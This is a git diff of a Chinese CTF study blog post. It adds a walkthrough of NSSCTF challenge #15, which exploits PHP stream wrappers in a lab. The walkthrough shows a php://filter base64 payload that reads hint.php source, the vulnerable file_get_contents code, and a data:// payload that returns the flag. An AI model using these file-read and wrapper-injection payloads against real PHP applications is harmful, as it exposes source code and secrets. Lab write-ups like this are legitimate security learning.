@@ -1,3 +1,15 @@
+---
+title: ""
+image: ''
+pinned: false
+comment: true
+published: 2026-04-16
+updated: 2026-04-16
+description: ""
+category: 刷题
+tags: [刷题]
+---
+
 ﻿---
 title: "nssctf学习中"
 image: '/images/133301699_p0_master1200.jpg'
@@ -1165,39 +1177,70 @@ else{
 
 
 
-# #15
+# #15.PseudoProtocols
+
+web，php伪协议使用。
+
+![image-20260416190317223](/images/image-20260416190317223.png)
+
+题目题型存在一个 `hint.php` ，但是正常输入文件，或者直接读取是不行的。
+
+联合题目描述，想到用 `php://filter/` 即php伪协议。
+
+但即便这样也不行，这时候想到是不是要编码一下，所以使用了base64.
+
+```
+php://filter/read=convert.base64-encode/resource=hint.php
+```
+
+成功得到一串base64字符串，解码后得到：
+
+```
+test2222222222222.php
+```
+
+输入这个path。
+
+得到一串php代码。
 
 ```
 <?php
+ini_set("max_execution_time", "180");
 show_source(__FILE__);
-include("class.php");
-$conn = new mysqli();
-
-if(isset($_POST['config']) && is_array($_POST['config'])){
-    foreach($_POST['config'] as $key => $val){
-        $value = is_numeric($var)?(int)$val:$val;
-        $conn->set_opt($key, $value);
-    }
+include('flag.php');
+$a= $_GET["a"];
+if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
+    echo "success\n";
+    echo $flag;
 }
-
-if(isset($_POST['mysql']) && is_array($_POST['mysql'])){
-    $my = $_POST['mysql'];
-    if($conn->real_connect($my['host'], $my['user'], $my['pass'], $my['dbname'], $my['port'])){
-        echo "connect success";
-        $conn->query("show databases;");
-    }
-    else{
-        echo "connect fail";
-    }
-    
-}
-else{
-    include("function.php");
-}
-
-$conn->close();
-?> connect success
+?>
 ```
+
+直接看后面的，get获取传入参数a的值，然后要求从a中读取到 'I want flag' ，直接利用php:data协议写入数据，并读取，获得flag。
+
+```
+?a=data://text/plain,I want flag
+```
+
+
+
+----
+
+
+
+# #16.
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -1206,4 +1249,3 @@ $conn->close();
 ---
 
 - **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
-
